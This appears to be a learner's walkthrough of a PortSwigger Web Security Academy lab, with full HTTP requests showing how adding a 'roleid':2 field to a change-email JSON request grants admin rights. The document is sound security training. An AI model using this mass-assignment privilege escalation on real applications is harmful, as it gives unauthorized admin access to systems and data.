@@ -1,1 +1,111 @@
+Lab Description:
 
+This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.
+Solve the lab by accessing the admin panel and using it to delete the user carlos.
+You can log in to your own account using the following credentials: wiener:peter 
+
+This lab has a vulnerability based on a parameter, by the description, the parameter is the roleid, so i try to enter the parameter on two different request, the first is in the login page and the second is the admin page, as follows:
+
+Login Page Request:
+
+POST /login HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Origin: https://LAB_ID.web-security-academy.net
+Referer: https://LAB_ID.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+username=wiener&password=peter&roleid=2
+
+Admin Page Request:
+
+GET /admin?roleid=2 HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+Both were unsuccessful, analysing the application, i can test other functions, on the my-account page is possible to change the e-mail of the current user, so i try and intercepted it with Burp:
+
+POST /my-account/change-email HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 42
+Origin: https://LAB_ID.web-security-academy.net
+Referer: https://LAB_ID.web-security-academy.net/my-account?id=wiener
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+{
+  "email":"test@test.com"
+}
+
+The new e-mail is set using JSON, so i decide to try adding another pair of values, the roleid with the number 2 (used by admins):
+
+POST /my-account/change-email HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSIONID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 42
+Origin: https://LAB_ID.web-security-academy.net
+Referer: https://LAB_ID.web-security-academy.net/my-account?id=wiener
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+{  
+  "email":"test@test.com",
+  "roleid":2
+}
+
+After forwarding the request, i receveid the following response:
+
+HTTP/2 302 Found
+Location: /my-account
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 117
+
+{
+  "username": "wiener",
+  "email": "test@test.com",
+  "apikey": "APIKEY",
+  "roleid": 2
+}
+
+Now, the user wiener is a admin, so the next step is to reload the my-account page and now there is a admin panel link on the user interface, to solve the lab, just access it and delete the user Carlos.
